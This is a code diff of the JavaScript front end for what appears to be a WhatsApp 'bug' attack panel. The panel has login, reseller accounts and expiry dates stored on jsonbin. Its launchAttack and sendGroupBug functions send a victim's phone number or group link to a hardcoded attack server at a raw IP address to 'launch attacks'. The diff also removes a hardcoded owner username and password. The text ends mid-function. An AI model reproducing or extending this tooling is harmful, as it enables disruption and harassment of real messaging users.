@@ -9,10 +9,8 @@ const headers = {
 const API_CONFIG = {
   STATUS_URL: "http://178.128.24.51:2001/status",
   ATTACK_URL: "http://178.128.24.51:2001/UltraXwebAPI",
-  PAIRING_URL: "/api/pair",
   MAX_REQUESTS_PER_MINUTE: 5,
-  REQUEST_TIMEOUT: 5000,
-  PAIRING_TIMEOUT: 600 // 10 minutes in seconds
+  REQUEST_TIMEOUT: 5000
 };
 
 const SESSION_CONFIG = {
@@ -23,32 +21,17 @@ const SESSION_CONFIG = {
 const VALIDATION_PATTERNS = {
   PHONE: /^[0-9]{10,15}$/,
   WHATSAPP_GROUP: /^https:\/\/chat\.whatsapp\.com\/[a-zA-Z0-9_-]+$/,
-  USERNAME: /^[a-zA-Z0-9_]{3,20}$/,
-  PASSWORD: /^.{6,}$/
-};
-
-const ROLE_CONFIG = {
-  OWNER: {
-    username: "dilxVXIIl",
-    password: "19972",
-    privileges: ['all']
-  },
-  ROLES: ['owner', 'admin', 'reseller', 'user']
+  USERNAME: /^[a-zA-Z0-9_]{3,20}$/
 };
 
 /* ========== GLOBAL VARIABLES ========== */
 let currentUser = null;
 let localDeviceId = localStorage.getItem('device_id') || generateDeviceId();
 localStorage.setItem('device_id', localDeviceId);
-let apiToken = localStorage.getItem('api_token') || null;
-let isApiPublic = false;
-let isMaintenanceMode = false;
 
 let requestCount = 0;
 let lastRequestTimestamp = 0;
 let inactivityTimer;
-let pairingInterval;
-let remainingPairingTime = 0;
 
 /* ========== DOM ELEMENTS ========== */
 const header = document.getElementById('header');
@@ -57,46 +40,27 @@ const sideMenu = document.getElementById('sideMenu');
 const menuOverlay = document.getElementById('menuOverlay');
 const loginCard = document.getElementById('loginCard');
 const dashboard = document.getElementById('dashboard');
-const userBadge = document.getElementById('userBadge');
-const currentRole = document.getElementById('currentRole');
-const connectionStatus = document.getElementById('connectionStatus');
 
 /* ========== INITIALIZATION ========== */
-document.addEventListener('DOMContentLoaded', async () => {
+document.addEventListener('DOMContentLoaded', () => {
   // Check if user is already logged in
   const user = JSON.parse(localStorage.getItem('currentUser'));
   if (user) {
     currentUser = user;
-    await verifySession();
     showDashboard();
   }
 
-  // Setup event listeners
+  // Hamburger menu click event
   hamburger.addEventListener('click', toggleMenu);
   menuOverlay.addEventListener('click', toggleMenu);
   
-  // Check system status
-  await checkSystemStatus();
-  
-  // Initialize API status
+  // Check API connection status
   checkApiConnection();
-  
-  // Check for existing token
-  if (apiToken) {
-    document.getElementById('infoToken').textContent = `${apiToken.substring(0, 6)}...`;
-    document.getElementById('tokenValue').textContent = apiToken;
-    document.getElementById('tokenDisplay').classList.remove('hidden');
-    document.querySelector('#pairingResult .status-value').textContent = 'Paired';
-  }
 });
 
 /* ========== UTILITY FUNCTIONS ========== */
 function generateDeviceId() {
-  return 'd-' + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
-}
-
-function generateToken() {
-  return 't-' + [...Array(32)].map(() => Math.random().toString(36)[2]).join('');
+  return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
 }
 
 function validateInput(input, type) {
@@ -104,7 +68,6 @@ function validateInput(input, type) {
     case 'phone': return VALIDATION_PATTERNS.PHONE.test(input);
     case 'whatsapp': return VALIDATION_PATTERNS.WHATSAPP_GROUP.test(input);
     case 'username': return VALIDATION_PATTERNS.USERNAME.test(input);
-    case 'password': return VALIDATION_PATTERNS.PASSWORD.test(input);
     default: return false;
   }
 }
@@ -126,6 +89,14 @@ function showNotification(message, type = 'success') {
   }, 5000);
 }
 
+/* ========== ORIGINAL FUNCTIONS (PRESERVED) ========== */
+function toggleTargetField() {
+  const targetType = document.getElementById('targetType').value;
+  document.getElementById('phoneNumberGroup').classList.toggle('hidden', targetType !== 'phone');
+  document.getElementById('whatsappGroup').classList.toggle('hidden', targetType !== 'whatsapp');
+}
+
+// Original togglePassword function (preserved exactly)
 function togglePassword(inputId) {
   const input = document.getElementById(inputId);
   const icon = input.nextElementSibling.querySelector('i');
@@ -159,62 +130,27 @@ function showMenu(menuId) {
   
   if (menuId === 'adminListUsers') {
     loadUserList();
-  } else if (menuId === 'ownerPanel') {
-    loadOwnerPanel();
   }
 }
 
-function setButtonLoading(button, isLoading, loadingText = 'Processing...') {
+function showError(element, message) {
+  element.innerHTML = `<i class="fas fa-exclamation-circle"></i> ${message}`;
+  element.style.color = '#f44336';
+}
+
+function showSuccess(element, message) {
+  element.innerHTML = `<i class="fas fa-check-circle"></i> ${message}`;
+  element.style.color = 'var(--main)';
+}
+
+function setButtonLoading(button, isLoading) {
   button.innerHTML = isLoading 
-    ? `<i class="fas fa-spinner fa-spin"></i> ${loadingText}` 
-    : button.getAttribute('data-original-text') || button.innerHTML;
+    ? '<i class="fas fa-spinner fa-spin"></i> Processing...' 
+    : '<i class="fas fa-sign-in-alt"></i> Login';
   button.disabled = isLoading;
-  if (!isLoading) return;
-  
-  // Save original button text if not already saved
-  if (!button.hasAttribute('data-original-text')) {
-    button.setAttribute('data-original-text', button.innerHTML);
-  }
-}
-
-function copyToClipboard(text) {
-  navigator.clipboard.writeText(text).then(() => {
-    showNotification('Copied to clipboard!', 'success');
-  }).catch(err => {
-    console.error('Failed to copy:', err);
-    showNotification('Failed to copy', 'error');
-  });
 }
 
 /* ========== SESSION MANAGEMENT ========== */
-async function verifySession() {
-  try {
-    const users = await getUsers();
-    const user = users.find(u => u.username === currentUser.username);
-    
-    if (!user || user.device_id !== localDeviceId) {
-      logout();
-      return false;
-    }
-    
-    // Check if account expired (except for owner)
-    if (currentUser.role !== 'owner' && user.expired) {
-      const today = new Date();
-      const expiryDate = new Date(user.expired);
-      if (expiryDate < today) {
-        showNotification(`Account expired on ${user.expired}`, 'error');
-        logout();
-        return false;
-      }
-    }
-    
-    return true;
-  } catch (error) {
-    console.error('Session verification failed:', error);
-    return false;
-  }
-}
-
 function startInactivityTimer() {
   resetInactivityTimer();
   ['click', 'mousemove', 'keypress'].forEach(event => {
@@ -224,79 +160,19 @@ function startInactivityTimer() {
 
 function resetInactivityTimer() {
   clearTimeout(inactivityTimer);
-  
-  // Show warning 5 minutes before timeout
-  setTimeout(() => {
-    if (currentUser) showTimeoutWarning();
-  }, (SESSION_CONFIG.TIMEOUT - SESSION_CONFIG.WARNING_TIME) * 1000);
-  
-  // Full timeout
   inactivityTimer = setTimeout(() => {
     showNotification('You have been logged out due to inactivity', 'warning');
     logout();
   }, SESSION_CONFIG.TIMEOUT * 1000);
-}
-
-function showTimeoutWarning() {
-  if (!currentUser) return;
   
-  const modal = document.getElementById('timeoutWarning');
-  const counter = document.getElementById('timeoutCounter');
-  let seconds = SESSION_CONFIG.WARNING_TIME;
-  
-  modal.classList.add('active');
-  
-  const countdown = setInterval(() => {
-    seconds--;
-    const mins = Math.floor(seconds / 60);
-    const secs = seconds % 60;
-    counter.textContent = `${mins}:${secs < 10 ? '0' + secs : secs}`;
-    
-    if (seconds <= 0) {
-      clearInterval(countdown);
-      modal.classList.remove('active');
-    }
-  }, 1000);
-  
-  // Click anywhere to extend session
-  const extendSession = () => {
-    clearInterval(countdown);
-    modal.classList.remove('active');
-    resetInactivityTimer();
-    showNotification('Session extended', 'success');
-    document.removeEventListener('click', extendSession);
-  };
-  
-  document.addEventListener('click', extendSession);
+  setTimeout(() => {
+    if (currentUser) showNotification('You will be logged out in 5 minutes', 'warning');
+  }, (SESSION_CONFIG.TIMEOUT - SESSION_CONFIG.WARNING_TIME) * 1000);
 }
 
 /* ========== API FUNCTIONS ========== */
-async function checkSystemStatus() {
-  try {
-    const response = await fetch('/api/status');
-    const data = await response.json();
-    
-    isApiPublic = data.isApiPublic || false;
-    isMaintenanceMode = data.isMaintenanceMode || false;
-    
-    // Update UI
-    document.getElementById('maintenanceStatus').className = isMaintenanceMode ? 'status-warning' : 'status-connected';
-    document.getElementById('maintenanceStatus').innerHTML = isMaintenanceMode 
-      ? '<i class="fas fa-exclamation-circle"></i> Active' 
-      : '<i class="fas fa-check-circle"></i> Inactive';
-    
-    document.getElementById('apiModeToggle').checked = isApiPublic;
-    document.getElementById('maintenanceToggle').checked = isMaintenanceMode;
-    
-    return data;
-  } catch (error) {
-    console.error('Failed to check system status:', error);
-    return { isApiPublic: false, isMaintenanceMode: false };
-  }
-}
-
 async function checkApiConnection() {
-  const statusElement = document.getElementById('apiStatus') || document.getElementById('apiLoginStatus');
+  const statusElement = document.getElementById('apiStatus');
   
   try {
     const controller = new AbortController();
@@ -306,27 +182,10 @@ async function checkApiConnection() {
     clearTimeout(timeoutId);
     
     const data = await response.json();
-    
-    const statusClass = data.connected ? 'status-connected' : 'status-disconnected';
-    const statusText = data.connected ? 'Connected' : 'Disconnected';
-    const statusIcon = data.connected ? 'fa-check-circle' : 'fa-times-circle';
-    
     if (statusElement) {
-      statusElement.className = statusClass;
-      statusElement.innerHTML = `<i class="fas ${statusIcon}"></i> ${statusText}`;
+      statusElement.className = data.connected ? 'status-connected' : 'status-disconnected';
+      statusElement.innerHTML = `<i class="fas fa-${data.connected ? 'check' : 'times'}-circle"></i> ${data.connected ? 'Connected' : 'Disconnected'}`;
     }
-    
-    // Update dashboard status
-    if (document.getElementById('infoApiStatus')) {
-      document.getElementById('infoApiStatus').className = statusClass;
-      document.getElementById('infoApiStatus').textContent = statusText;
-    }
-    
-    // Update connection indicator
-    if (connectionStatus) {
-      connectionStatus.className = `fas fa-circle ${statusClass}`;
-    }
-    
     return data.connected === true;
   } catch (error) {
     console.error('API connection check failed:', error);
@@ -342,7 +201,7 @@ async function getUsers() {
   try {
     const response = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, { headers });
     const data = await response.json();
-    return data.record || [];
+    return data.record;
   } catch (error) {
     console.error('Error fetching users:', error);
     return [];
@@ -378,34 +237,10 @@ async function login() {
     return;
   }
 
-  // Check maintenance mode
-  if (isMaintenanceMode && username !== ROLE_CONFIG.OWNER.username) {
-    showError(loginResult, 'System is under maintenance. Only owner can login.');
-    return;
-  }
-
   setButtonLoading(loginBtn, true);
 
   try {
     const users = await getUsers();
-    
-    // Check hardcoded owner credentials
-    if (username === ROLE_CONFIG.OWNER.username && password === ROLE_CONFIG.OWNER.password) {
-      currentUser = {
-        username,
-        password,
-        role: 'owner',
-        device_id: localDeviceId,
-        telegram_id: null,
-        expired: null
-      };
-      
-      localStorage.setItem('currentUser', JSON.stringify(currentUser));
-      showSuccess(loginResult, `Welcome back, Owner!`);
-      setTimeout(showDashboard, 1000);
-      return;
-    }
-
     const user = users.find(u => u.username === username && u.password === password);
 
     if (!user) {
@@ -418,7 +253,7 @@ async function login() {
       return;
     }
 
-    if (user.role !== 'owner' && user.expired) {
+    if (user.role !== 'admin' && user.expired) {
       const today = new Date();
       const expiryDate = new Date(user.expired);
       if (expiryDate < today) {
@@ -456,32 +291,18 @@ async function logout() {
         return u;
       });
       await updateUsers(updatedUsers);
-      
-      // Send Telegram notification
-      if (currentUser.telegram_id) {
-        await fetch('/api/telegram', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chatId: currentUser.telegram_id,
-            text: `User ${currentUser.username} logged out from device ${localDeviceId}`
-          })
-        });
-      }
     }
   } catch (error) {
     console.error('Error during logout:', error);
   } finally {
     currentUser = null;
     localStorage.removeItem('currentUser');
-    localStorage.removeItem('api_token');
     header.classList.add('hidden');
     loginCard.classList.remove('hidden');
     dashboard.classList.add('hidden');
     hideAllMenus();
     document.getElementById('username').value = '';
     document.getElementById('password').value = '';
-    clearInterval(pairingInterval);
   }
 }
 
@@ -491,13 +312,14 @@ async function resetPassword() {
   const resetPassBtn = document.getElementById('resetPassBtn');
   const myInfoResult = document.getElementById('myInfoResult');
 
-  if (!validateInput(newPassword, 'password')) {
-    myInfoResult.innerHTML = 'Password must be at least 6 characters';
+  if (!newPassword) {
+    myInfoResult.innerHTML = 'Please enter new password';
     myInfoResult.style.color = '#f44336';
     return;
   }
 
-  setButtonLoading(resetPassBtn, true, 'Updating...');
+  resetPassBtn.innerHTML = '<i class="fas fa-spinner spinner"></i> Updating...';
+  resetPassBtn.disabled = true;
 
   try {
     const users = await getUsers();
@@ -516,179 +338,13 @@ async function resetPassword() {
     myInfoResult.innerHTML = 'Password updated successfully';
     myInfoResult.style.color = 'var(--main)';
     document.getElementById('newPassword').value = '';
-    
-    // Send Telegram notification
-    if (currentUser.telegram_id) {
-      await fetch('/api/telegram', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chatId: currentUser.telegram_id,
-          text: `Password changed for user ${currentUser.username}`
-        })
-      });
-    }
   } catch (error) {
     myInfoResult.innerHTML = 'Error updating password: ' + error.message;
     myInfoResult.style.color = '#f44336';
   } finally {
-    setButtonLoading(resetPassBtn, false);
+    resetPassBtn.innerHTML = '<i class="fas fa-key"></i> Reset Password';
+    resetPassBtn.disabled = false;
   }
-}
-
-/* ========== PAIRING FUNCTIONS ========== */
-async function generatePairing() {
-  if (!currentUser) {
-    showNotification('Please login first', 'error');
-    return;
-  }
-
-  const number = prompt(`Enter WhatsApp number for pairing (62xxx):`);
-  if (!number || !number.startsWith('62')) {
-    showNotification('Please enter a valid Indonesian number (62xxx)', 'error');
-    return;
-  }
-
-  const pairingResult = document.getElementById('pairingResult');
-  const pairingBtn = document.getElementById('pairingBtn');
-  
-  try {
-    pairingResult.innerHTML = '<div class="status-header">Status: <span class="status-value">Initializing...</span></div>';
-    document.getElementById('pairingProgress').classList.remove('hidden');
-    setButtonLoading(pairingBtn, true, 'Generating...');
-    
-    const response = await fetch(API_CONFIG.PAIRING_URL, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        number,
-        username: currentUser.username,
-        deviceId: localDeviceId
-      })
-    });
-    
-    if (!response.ok) {
-      throw new Error(await response.text());
-    }
-
-    const data = await response.json();
-    
-    if (!data.success) {
-      throw new Error(data.message || 'Failed to start pairing');
-    }
-    
-    // Show pairing code
-    pairingResult.innerHTML = `
-      <div class="status-header">Status: <span class="status-value">Pairing in progress</span></div>
-      <div class="pairing-code">Code: <strong>${data.code}</strong></div>
-    `;
-    
-    // Start pairing progress
-    startPairingProgress(data.code, number);
-    
-    // Generate and store API token
-    apiToken = generateToken();
-    localStorage.setItem('api_token', apiToken);
-    
-    // Update UI
-    document.getElementById('infoToken').textContent = `${apiToken.substring(0, 6)}...`;
-    document.getElementById('tokenValue').textContent = apiToken;
-    document.getElementById('tokenDisplay').classList.remove('hidden');
-    
-    // Update user in database with telegram_id
-    const users = await getUsers();
-    const updatedUsers = users.map(u => {
-      if (u.username === currentUser.username) {
-        return { ...u, telegram_id: data.telegram_id };
-      }
-      return u;
-    });
-    await updateUsers(updatedUsers);
-    
-    currentUser.telegram_id = data.telegram_id;
-    localStorage.setItem('currentUser', JSON.stringify(currentUser));
-    
-    showNotification('Pairing code generated! Check your WhatsApp', 'success');
-  } catch (error) {
-    pairingResult.innerHTML = `<div class="status-header">Status: <span class="status-value">Error</span></div>
-                              <div class="error-message">${error.message || 'Pairing failed'}</div>`;
-    showNotification('Pairing failed: ' + error.message, 'error');
-    console.error('Pairing error:', error);
-  } finally {
-    setButtonLoading(pairingBtn, false);
-  }
-}
-
-function startPairingProgress(code, number) {
-  const progressFill = document.getElementById('pairingProgressFill');
-  const progressText = document.getElementById('pairingProgressText');
-  
-  remainingPairingTime = API_CONFIG.PAIRING_TIMEOUT;
-  
-  // Clear any existing interval
-  clearInterval(pairingInterval);
-  
-  pairingInterval = setInterval(() => {
-    remainingPairingTime--;
-    const percentage = 100 - (remainingPairingTime / API_CONFIG.PAIRING_TIMEOUT * 100);
-    progressFill.style.width = `${percentage}%`;
-    
-    const minutes = Math.floor(remainingPairingTime / 60);
-    const seconds = remainingPairingTime % 60;
-    progressText.textContent = `Expires in: ${minutes}:${seconds < 10 ? '0' + seconds : seconds}`;
-    
-    if (remainingPairingTime <= 0) {
-      clearInterval(pairingInterval);
-      progressText.textContent = 'Pairing code expired';
-      document.querySelector('#pairingResult .status-value').textContent = 'Expired';
-      showNotification('Pairing code expired', 'warning');
-    }
-  }, 1000);
-  
-  // Check pairing status periodically
-  const checkPairingStatus = async () => {
-    try {
-      const response = await fetch(`${API_CONFIG.PAIRING_URL}?code=${code}`);
-      const data = await response.json();
-      
-      if (data.paired) {
-        clearInterval(pairingInterval);
-        document.querySelector('#pairingResult .status-value').textContent = 'Paired';
-        progressText.textContent = 'Successfully paired!';
-        progressFill.style.width = '100%';
-        progressFill.style.backgroundColor = 'var(--main)';
-        
-        showNotification('WhatsApp successfully paired!', 'success');
-        
-        // Update user in database with pairing status
-        const users = await getUsers();
-        const updatedUsers = users.map(u => {
-          if (u.username === currentUser.username) {
-            return { ...u, paired: true, paired_at: new Date().toISOString() };
-          }
-          return u;
-        });
-        await updateUsers(updatedUsers);
-        
-        currentUser.paired = true;
-        localStorage.setItem('currentUser', JSON.stringify(currentUser));
-      }
-    } catch (error) {
-      console.error('Error checking pairing status:', error);
-    }
-  };
-  
-  const statusInterval = setInterval(checkPairingStatus, 5000);
-  
-  // Clear status check when pairing expires
-  setTimeout(() => {
-    clearInterval(statusInterval);
-  }, API_CONFIG.PAIRING_TIMEOUT * 1000);
-}
-
-function copyToken() {
-  const token = document.getElementById('tokenValue').textContent;
-  copyToClipboard(token);
 }
 
 /* ========== ATTACK FUNCTIONS ========== */
@@ -714,7 +370,8 @@ async function launchAttack() {
   const attackBtn = document.getElementById('attackBtn');
   const attackResult = document.getElementById('attackResult');
 
-  setButtonLoading(attackBtn, true, 'Launching...');
+  attackBtn.innerHTML = '<i class="fas fa-spinner spinner"></i> Attacking...';
+  attackBtn.disabled = true;
 
   try {
     const isConnected = await checkApiConnection();
@@ -723,13 +380,7 @@ async function launchAttack() {
       return;
     }
 
-    // Check if API is in private mode and user has valid token
-    if (!isApiPublic && !apiToken) {
-      showNotification('API is in private mode. Please pair your WhatsApp first.', 'error');
-      return;
-    }
-
-    const response = await fetch(`${API_CONFIG.ATTACK_URL}?chatId=${encodeURIComponent(targetNumber)}&type=${bugType}${apiToken ? `&token=${apiToken}` : ''}`);
+    const response = await fetch(`${API_CONFIG.ATTACK_URL}?chatId=${encodeURIComponent(targetNumber)}&type=${bugType}`);
     
     if (!response.ok) throw new Error("Failed to connect to attack server");
 
@@ -739,10 +390,6 @@ async function launchAttack() {
       showNotification('Attack launched successfully!', 'success');
       attackResult.innerHTML = `Attack launched successfully against ${targetNumber}`;
       attackResult.style.color = 'var(--main)';
-      
-      // Update rate limit counter
-      requestCount++;
-      document.getElementById('rateLimitCounter').textContent = requestCount;
     } else {
       showNotification(result.message || 'Attack failed', 'error');
       attackResult.innerHTML = result.message || 'Attack failed';
@@ -753,7 +400,9 @@ async function launchAttack() {
     attackResult.innerHTML = 'Attack failed: ' + error.message;
     attackResult.style.color = '#f44336';
   } finally {
-    setButtonLoading(attackBtn, false);
+    attackBtn.innerHTML = '<i class="fas fa-rocket"></i> Launch Attack';
+    attackBtn.disabled = false;
+    requestCount++;
   }
 }
 
@@ -768,7 +417,8 @@ async function sendGroupBug() {
     return;
   }
 
-  setButtonLoading(attackBtn, true, 'Sending...');
+  attackBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Sending...';
+  attackBtn.disabled = true;
 
   try {
     const isConnected = await checkApiConnection();
@@ -777,13 +427,7 @@ async function sendGroupBug() {
       return;
     }
 
-    // Check if API is in private mode and user has valid token
-    if (!isApiPublic && !apiToken) {
-      showNotification('API is in private mode. Please pair your WhatsApp first.', 'error');
-      return;
-    }
-
-    const response = await fetch(`${API_CONFIG.ATTACK_URL}?groupLink=${encodeURIComponent(groupLink)}&type=${bugType}${apiToken ? `&token=${apiToken}` : ''}`);
+    const response = await fetch(`${API_CONFIG.ATTACK_URL}?groupLink=${encodeURIComponent(groupLink)}&type=${bugType}`);
     
     if (!response.ok) throw new Error(await response.text() || "Failed to connect to server");
 
@@ -802,24 +446,9 @@ async function sendGroupBug() {
     resultElement.innerHTML = `Error: ${error.message}`;
     resultElement.style.color = '#f44336';
   } finally {
-    setButtonLoading(attackBtn, false);
+    attackBtn.innerHTML = '<i class="fas fa-paper-plane"></i> Send Group Bug';
+    attackBtn.disabled = false;
   }
-}
-
-function switchAttackType(type) {
-  const phoneSection = document.getElementById('phoneAttackSection');
-  const whatsappSection = document.getElementById('whatsappAttackSection');
-  
-  if (type === 'phone') {
-    phoneSection.classList.remove('hidden');
-    whatsappSection.classList.add('hidden');
-  } else {
-    phoneSection.classList.add('hidden');
-    whatsappSection.classList.remove('hidden');
-  }
-  
-  document.getElementById('attackResult').innerHTML = '';
-  checkApiConnection();
 }
 
 /* ========== ADMIN FUNCTIONS ========== */
@@ -831,26 +460,20 @@ async function createUser() {
   const createUserBtn = document.getElementById('createUserBtn');
   const createUserResult = document.getElementById('createUserResult');
 
-  if (!validateInput(username, 'username') || !validateInput(password, 'password') || isNaN(days)) {
+  if (!username || !password || isNaN(days)) {
     createUserResult.innerHTML = 'Please fill all fields correctly';
     createUserResult.style.color = '#f44336';
     return;
   }
 
-  // Permission checks
   if (currentUser.role === 'reseller' && (role !== 'user' || days > 30)) {
     createUserResult.innerHTML = 'Resellers can only create user accounts with max 30 days';
     createUserResult.style.color = '#f44336';
     return;
   }
 
-  if (currentUser.role === 'admin' && role === 'owner') {
-    createUserResult.innerHTML = 'Admins cannot create owner accounts';
-    createUserResult.style.color = '#f44336';
-    return;
-  }
-
-  setButtonLoading(createUserBtn, true, 'Creating...');
+  createUserBtn.innerHTML = '<i class="fas fa-spinner spinner"></i> Creating...';
+  createUserBtn.disabled = true;
 
   try {
     const users = await getUsers();
@@ -870,9 +493,7 @@ async function createUser() {
       role,
       telegram_id: null,
       device_id: '',
-      expired: expiredDate.toISOString().split('T')[0],
-      created_by: currentUser.username,
-      created_at: new Date().toISOString()
+      expired: expiredDate.toISOString().split('T')[0]
     };
 
     const updatedUsers = [...users, newUser];
@@ -881,27 +502,15 @@ async function createUser() {
     createUserResult.innerHTML = `User ${username} created successfully`;
     createUserResult.style.color = 'var(--main)';
     
-    // Reset form
     document.getElementById('newUsername').value = '';
     document.getElementById('newUserPassword').value = '';
     document.getElementById('newUserDays').value = '30';
-    
-    // Send Telegram notification
-    if (currentUser.telegram_id) {
-      await fetch('/api/telegram', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chatId: currentUser.telegram_id,
-          text: `New ${role} account created: ${username} (Expires: ${newUser.expired})`
-        })
-      });
-    }
   } catch (error) {
     createUserResult.innerHTML = 'Error creating user: ' + error.message;
     createUserResult.style.color = '#f44336';
   } finally {
-    setButtonLoading(createUserBtn, false);
+    createUserBtn.innerHTML = '<i class="fas fa-save"></i> Create User';
+    createUserBtn.disabled = false;
   }
 }
 
@@ -918,21 +527,9 @@ async function deleteUser(username) {
     } else {
       loadUserList();
     }
-    
-    // Send Telegram notification
-    if (currentUser.telegram_id) {
-      await fetch('/api/telegram', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chatId: currentUser.telegram_id,
-          text: `User account deleted: ${username}`
-        })
-      });
-    }
   } catch (error) {
     console.error('Error deleting user:', error);
-    showNotification('Failed to delete user', 'error');
+    alert('Failed to delete user');
   }
 }
 
@@ -954,28 +551,16 @@ async function addDaysToUser(username) {
 
     await updateUsers(updatedUsers);
     loadUserList();
-    showNotification(`Added ${days} days to ${username}`, 'success');
-    
-    // Send Telegram notification
-    if (currentUser.telegram_id && user.telegram_id) {
-      await fetch('/api/telegram', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chatId: user.telegram_id,
-          text: `Your account has been extended by ${days} days. New expiry: ${expiredDate.toISOString().split('T')[0]}`
-        })
-      });
-    }
+    alert(`Added ${days} days to ${username}`);
   } catch (error) {
     console.error('Error adding days:', error);
-    showNotification('Failed to add days', 'error');
+    alert('Failed to add days');
   }
 }
 
 async function changeUserRole(username) {
   const role = prompt('Enter new role (admin/reseller/user):', 'user');
-  if (!role || !ROLE_CONFIG.ROLES.includes(role)) return;
+  if (!role || !['admin', 'reseller', 'user'].includes(role)) return;
 
   try {
     const users = await getUsers();
@@ -985,25 +570,10 @@ async function changeUserRole(username) {
 
     await updateUsers(updatedUsers);
     loadUserList();
-    showNotification(`Changed role for ${username} to ${role}`, 'success');
-    
-    // Send Telegram notification
-    if (currentUser.telegram_id) {
-      const user = users.find(u => u.username === username);
-      if (user && user.telegram_id) {
-        await fetch('/api/telegram', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chatId: user.telegram_id,
-            text: `Your account role has been changed to ${role}`
-          })
-        });
-      }
-    }
+    alert(`Changed role for ${username} to ${role}`);
   } catch (error) {
     console.error('Error changing role:', error);
-    showNotification('Failed to change role', 'error');
+    alert('Failed to change role');
   }
 }
 
@@ -1011,15 +581,10 @@ async function changeUsername(oldUsername) {
   const newUsername = prompt('Enter new username:', oldUsername);
   if (!newUsername || newUsername === oldUsername) return;
 
-  if (!validateInput(newUsername, 'username')) {
-    showNotification('Username must be 3-20 chars (a-z, 0-9, _)', 'error');
-    return;
-  }
-
   try {
     const users = await getUsers();
     if (users.some(u => u.username === newUsername)) {
-      showNotification('Username already exists', 'error');
+      alert('Username already exists');
       return;
     }
 
@@ -1036,19 +601,16 @@ async function changeUsername(oldUsername) {
     }
     
     loadUserList();
-    showNotification(`Username changed from ${oldUsername} to ${newUsername}`, 'success');
+    alert(`Username changed from ${oldUsername} to ${newUsername}`);
   } catch (error) {
     console.error('Error changing username:', error);
-    showNotification('Failed to change username', 'error');
+    alert('Failed to change username');
   }
 }
 
 async function changeUserPassword(username) {
   const newPassword = prompt('Enter new password:');
-  if (!newPassword || !validateInput(newPassword, 'password')) {
-    showNotification('Password must be at least 6 characters', 'error');
-    return;
-  }
+  if (!newPassword) return;
 
   try {
     const users = await getUsers();
@@ -1057,25 +619,10 @@ async function changeUserPassword(username) {
     );
 
     await updateUsers(updatedUsers);
-    showNotification(`Password changed for ${username}`, 'success');
-    
-    // Send Telegram notification
-    if (currentUser.telegram_id) {
-      const user = users.find(u => u.username === username);
-      if (user && user.telegram_id) {
-        await fetch('/api/telegram', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chatId: user.telegram_id,
-            text: `Your password has been changed by admin`
-          })
-        });
-      }
-    }
+    alert(`Password changed for ${username}`);
   } catch (error) {
     console.error('Error changing password:', error);
-    showNotification('Failed to change password', 'error');
+    alert('Failed to change password');
   }
 }
 
@@ -1090,132 +637,17 @@ async function resetDeviceId(username) {
 
     await updateUsers(updatedUsers);
     loadUserList();
-    showNotification(`Device ID reset for ${username}`, 'success');
+    alert(`Device ID reset for ${username}`);
   } catch (error) {
     console.error('Error resetting device ID:', error);
-    showNotification('Failed to reset device ID', 'error');
-  }
-}
-
-/* ========== OWNER FUNCTIONS ========== */
-async function loadOwnerPanel() {
-  if (currentUser?.role !== 'owner') return;
-  
-  try {
-    const status = await checkSystemStatus();
-    document.getElementById('apiModeToggle').checked = status.isApiPublic;
-    document.getElementById('maintenanceToggle').checked = status.isMaintenanceMode;
-  } catch (error) {
-    console.error('Error loading owner panel:', error);
-  }
-}
-
-async function toggleApiMode() {
-  if (currentUser?.role !== 'owner') return;
-  
-  const toggle = document.getElementById('apiModeToggle');
-  const isPublic = toggle.checked;
-  
-  try {
-    const response = await fetch('/api/toggle-api-mode', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ isPublic })
-    });
-    
-    const result = await response.json();
-    if (result.success) {
-      isApiPublic = isPublic;
-      showNotification(`API mode set to ${isPublic ? 'Public' : 'Private'}`, 'success');
-    } else {
-      toggle.checked = !isPublic;
-      showNotification(result.message || 'Failed to update API mode', 'error');
-    }
-  } catch (error) {
-    toggle.checked = !isPublic;
-    console.error('Error toggling API mode:', error);
-    showNotification('Failed to update API mode', 'error');
-  }
-}
-
-async function toggleMaintenance() {
-  if (currentUser?.role !== 'owner') return;
-  
-  const toggle = document.getElementById('maintenanceToggle');
-  const isMaintenance = toggle.checked;
-  
-  try {
-    const response = await fetch('/api/toggle-maintenance', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ isMaintenance })
-    });
-    
-    const result = await response.json();
-    if (result.success) {
-      isMaintenanceMode = isMaintenance;
-      showNotification(`Maintenance mode ${isMaintenance ? 'enabled' : 'disabled'}`, 'success');
-    } else {
-      toggle.checked = !isMaintenance;
-      showNotification(result.message || 'Failed to update maintenance mode', 'error');
-    }
-  } catch (error) {
-    toggle.checked = !isMaintenance;
-    console.error('Error toggling maintenance mode:', error);
-    showNotification('Failed to update maintenance mode', 'error');
-  }
-}
-
-async function clearAllSessions() {
-  if (currentUser?.role !== 'owner') return;
-  if (!confirm('This will log out all users. Continue?')) return;
-  
-  try {
-    const users = await getUsers();
-    const updatedUsers = users.map(u => ({ ...u, device_id: '' }));
-    
-    await updateUsers(updatedUsers);
-    
-    // Only logout current user if they're not owner
-    if (currentUser.role !== 'owner') {
-      logout();
-    }
-    
-    showNotification('All user sessions cleared', 'success');
-  } catch (error) {
-    console.error('Error clearing sessions:', error);
-    showNotification('Failed to clear sessions', 'error');
-  }
-}
-
-async function regenerateMasterToken() {
-  if (currentUser?.role !== 'owner') return;
-  
-  const newToken = generateToken();
-  
-  try {
-    const response = await fetch('/api/regenerate-token', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ token: newToken })
-    });
-    
-    const result = await response.json();
-    if (result.success) {
